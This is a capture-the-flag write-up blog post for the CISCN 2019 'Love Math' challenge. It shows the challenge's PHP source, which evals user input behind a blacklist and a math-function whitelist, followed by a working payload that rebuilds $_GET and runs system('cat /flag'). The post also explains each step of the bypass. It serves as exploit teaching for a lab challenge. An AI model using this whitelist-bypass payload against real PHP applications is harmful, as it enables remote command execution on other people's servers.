---
title: "[CISCN 2019 初赛]Love Math"
date: 2020-03-16
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# [CISCN 2019 初赛]Love Math

<!-- more -->

## WP

```
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

## payload

```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag
base_convert(37907361743,10,36)=>hex2bin
dechex(1598506324)=>"5f474554"
hex2bin("5f474554")=>_GET
$$pi=>$_GET
($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag=>$_GET{pi}$_GET{cos}pi=system&cos=cat
```

## 相同类型

- [NESTCTF 2019]Love Math 1
- [NESTCTF 2019]Love Math 2

## Reference

[[CISCN 2019 初赛\]Love Math](https://www.cnblogs.com/20175211lyz/p/11588219.html)